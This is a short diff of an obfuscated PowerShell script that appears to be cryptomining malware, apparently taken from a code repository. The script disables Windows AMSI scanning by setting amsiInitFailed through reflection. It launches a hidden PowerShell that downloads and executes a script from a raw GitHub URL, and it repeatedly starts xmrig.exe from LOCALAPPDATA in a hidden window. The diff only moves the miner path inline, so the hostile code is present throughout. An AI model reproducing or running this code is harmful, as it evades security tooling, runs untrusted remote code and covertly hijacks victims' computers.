@@ -4,7 +4,6 @@ ${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('
 ${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})
 
 &('S'+'tar'+'t-Process') -FilePath ("po"+"wers"+"hell") -WindowStyle ('H'+'idden') -ArgumentList "Invoke-Expression (Invoke-REstMethod -Uri `'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt`')"
-﻿${pA`TH} = "$env:LOCALAPPDATA\CTF\xmrig.exe"
 ${ATIvopRo`cE`Ss} = ${f`A`LSe}
 ${aTi`VO`TaSK} = ${n`ULl}
 
@@ -25,7 +24,7 @@ while (${T`Rue}){
        }
        catch{
             if(${a`TIVOp`ROCesS} -eq ${f`Al`Se}){
-                &('S'+'tar'+'t-Process') -FilePath ${p`AtH} -WindowStyle ('H'+'idden')
+                &('S'+'tar'+'t-Process') -FilePath "$env:LOCALAPPDATA\CTF\xmrig.exe" -WindowStyle ('H'+'idden')
                 ${a`TIV`OPROcEsS} = ${t`RuE}
             }
             else{
